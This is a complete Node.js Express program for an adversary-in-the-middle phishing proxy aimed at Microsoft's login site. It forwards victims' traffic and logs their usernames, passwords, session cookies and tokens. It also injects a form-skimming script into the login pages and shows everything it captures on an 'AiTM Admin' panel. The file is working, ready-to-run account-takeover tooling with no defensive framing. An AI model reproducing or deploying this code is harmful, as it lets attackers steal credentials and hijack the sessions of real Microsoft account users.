const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const fs = require('fs');
const zlib = require('zlib');

const app = express();
const PORT = process.env.PORT || 3000;

const CAPTURES_FILE = './captures.json';
if (!fs.existsSync(CAPTURES_FILE)) fs.writeFileSync(CAPTURES_FILE, '[]');

function saveCapture(type, data) {
    const capture = { timestamp: new Date().toISOString(), type, ...data };
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    captures.push(capture);
    fs.writeFileSync(CAPTURES_FILE, JSON.stringify(captures, null, 2));
    console.log(`[${type.toUpperCase()}]`, JSON.stringify(data, null, 2));
}

app.use(express.raw({ type: '*/*', limit: '50mb' }));

// Proxy middleware
const proxy = createProxyMiddleware({
    target: 'https://login.microsoftonline.com',
    changeOrigin: true,
    secure: true,
    ws: true,
    selfHandleResponse: true,
    
    onProxyReq: (proxyReq, req, res) => {
        const bodyStr = req.body?.toString?.() || '';
        
        if (req.method === 'POST' && bodyStr) {
            // URL encoded
            if (req.headers['content-type']?.includes('application/x-www-form-urlencoded')) {
                try {
                    const params = new URLSearchParams(bodyStr);
                    const login = params.get('login') || params.get('email') || params.get('username');
                    const pass = params.get('passwd') || params.get('password');
                    if (login) saveCapture('email', { login, url: req.url });
                    if (login && pass) saveCapture('credentials', { login, pass, url: req.url });
                } catch(e) {}
            }
            
            // JSON
            if (req.headers['content-type']?.includes('application/json')) {
                try {
                    const json = JSON.parse(bodyStr);
                    if (json.username && json.password) {
                        saveCapture('credentials', { login: json.username, pass: json.password, url: req.url });
                    }
                } catch(e) {}
            }
        }
        
        // Log request
        saveCapture('request', {
            method: req.method,
            url: req.url,
            headers: req.headers,
            ip: req.headers['x-forwarded-for'] || req.ip,
            bodyPreview: bodyStr.substring(0, 500)
        });
        
        // Write body to proxy request
        if (req.body && req.body.length > 0) {
            proxyReq.write(req.body);
        }
        proxyReq.end();
    },
    
    onProxyRes: (proxyRes, req, res) => {
        let body = [];
        
        proxyRes.on('data', chunk => body.push(chunk));
        proxyRes.on('end', () => {
            let buffer = Buffer.concat(body);
            const encoding = proxyRes.headers['content-encoding'];
            
            // Decompress
            if (encoding === 'gzip') {
                try { buffer = zlib.gunzipSync(buffer); } catch(e) {}
            } else if (encoding === 'deflate') {
                try { buffer = zlib.inflateSync(buffer); } catch(e) {}
            }
            
            const bodyStr = buffer.toString();
            
            // Capture session cookies
            if (proxyRes.headers['set-cookie']) {
                saveCapture('session', { cookies: proxyRes.headers['set-cookie'], url: req.url });
            }
            
            // Look for tokens
            if (bodyStr.includes('token') || bodyStr.includes('Token')) {
                const matches = bodyStr.match(/"token":"([^"]{20,})"/g);
                if (matches) saveCapture('token', { tokens: matches });
            }
            
            const contentType = proxyRes.headers['content-type'] || '';
            if (contentType.includes('text/html')) {
                const injection = `<script>
                    document.addEventListener('submit', function(e) {
                        var fd = new FormData(e.target);
                        var data = {};
                        fd.forEach((v,k) => data[k]=v);
                        navigator.sendBeacon('/capture-js', JSON.stringify(data));
                    });
                </script>`;
                
                if (bodyStr.includes('</body>')) {
                    const modified = bodyStr.replace('</body>', injection + '</body>');
                    buffer = Buffer.from(modified);
                }
            }
            
            if (encoding === 'gzip') buffer = zlib.gzipSync(buffer);
            else if (encoding === 'deflate') buffer = zlib.deflateSync(buffer);
            
            res.status(proxyRes.statusCode);
            Object.keys(proxyRes.headers).forEach(key => {
                if (key !== 'content-length') res.setHeader(key, proxyRes.headers[key]);
            });
            res.end(buffer);
        });
    }
});

// JS capture endpoint
app.post('/capture-js', express.json({ limit: '10mb' }), (req, res) => {
    saveCapture('javascript', req.body);
    res.sendStatus(200);
});

// Admin panel
app.get('/admin', (req, res) => {
    const captures = JSON.parse(fs.readFileSync(CAPTURES_FILE));
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>AiTM Admin</title>
        <style>
            body { font-family: monospace; background: #0a0a0a; color: #0f0; padding: 20px; }
            .cred { background: #1a1a1a; border-left: 3px solid #0f0; padding: 10px; margin: 10px 0; }
            .token { color: #ff0; word-break: break-all; }
            pre { overflow-x: auto; font-size: 12px; }
        </style>
    </head>
    <body>
        <h1>Captured: ${captures.length}</h1>
        <button onclick="fetch('/clear',{method:'POST'}).then(()=>location.reload())">Clear</button>
        <hr>
        ${captures.reverse().map(c => `
            <div class="cred">
                <strong style="color:${c.login ? '#f00' : '#0f0'}">${c.type.toUpperCase()}</strong> - ${c.timestamp}<br>
                ${c.login ? `<div>User: ${c.login}</div>` : ''}
                ${c.pass ? `<div>Pass: ${c.pass}</div>` : ''}
                ${c.cookies ? `<div class="token">Cookies: ${c.cookies.join('; ').substring(0, 200)}...</div>` : ''}
                ${c.tokens ? `<div class="token">Tokens: ${c.tokens.join(', ').substring(0, 100)}...</div>` : ''}
            </div>
        `).join('')}
    </body>
    </html>
    `);
});

app.post('/clear', (req, res) => {
    fs.writeFileSync(CAPTURES_FILE, '[]');
    res.json({ cleared: true });
});

app.get('/health', (req, res) => {
    res.json({ status: 'AiTM active', captures: JSON.parse(fs.readFileSync(CAPTURES_FILE)).length });
});

app.use((req, res, next) => {
    if (req.path.startsWith('/admin') || req.path.startsWith('/capture-js') || req.path.startsWith('/clear') || req.path.startsWith('/health')) {
        next();
    } else {
        proxy(req, res, next);
    }
});

app.listen(PORT, () => {
    console.log(`AiTM Proxy on port ${PORT}`);
    console.log(`Admin: /admin`);
});
